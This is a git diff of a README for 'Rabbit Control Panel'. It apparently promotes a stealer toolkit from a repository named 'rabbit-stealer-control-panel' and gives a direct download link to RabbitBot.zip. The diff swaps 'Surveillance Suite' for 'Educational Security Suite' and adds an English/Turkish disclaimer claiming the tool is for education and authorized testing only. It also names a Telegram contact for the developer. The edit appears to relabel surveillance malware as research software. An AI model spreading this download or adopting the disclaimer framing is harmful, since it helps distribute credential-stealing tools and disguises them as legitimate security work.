@@ -1,7 +1,7 @@
 <div align="center">
 
   <h1>🐇 RABBIT CONTROL PANEL</h1>
-  <p><b>Next-Generation Remote Administration & Surveillance Suite (Debian 12 Ready)</b></p>
+  <p><b>Next-Generation Remote Administration & Educational Security Suite (Debian 12 Ready)</b></p>
 
   <p>
     <a href="https://github.com/Elbahram0/rabbit-stealer-control-panel/raw/main/RabbitBot.zip">
@@ -29,7 +29,14 @@
 
 ---
 
-## ⚠️ Legal Disclaimer & Warning / Yasal Uyarı
+## ⚠️ Legal Disclaimer & Responsibility Warning / Yasal Uyarı ve Sorumluluk Reddi
+
+> [!WARNING]
+> **ENGLISH:** This software is developed strictly for **educational, research, authorized penetration testing, and administrative testing purposes only**. 
+> The developer ([@El_bahram](https://t.me/El_bahram)) assumes **NO RESPONSIBILITY OR LIABILITY** for any misuse, unauthorized access, illegal activities, or damage caused by this software. Users are solely responsible for complying with all applicable local, national, and international laws. Do NOT use this tool for illegal or malicious activities.
+>
+> **TÜRKÇE:** Bu yazılım yalnızca **eğitim, siber güvenlik araştırmaları, yetkili sistem yönetimi ve sızma testi (penetration test) amacıyla** geliştirilmiştir.
+> Yazılımın illegal veya amacı dışında kullanımından doğabilecek **hiçbir hukuki ve cezai sorumluluk geliştiriciye ([@El_bahram](https://t.me/El_bahram)) ait değildir; tüm sorumluluk tamamen kullanıcıya aittir.** Yazılımı izinsiz veya yasadışı faaliyetlerde kullanmayınız.
 
 > [!IMPORTANT]
 > **Bu proje tamamen ücretsiz ve açık kaynaktır!**
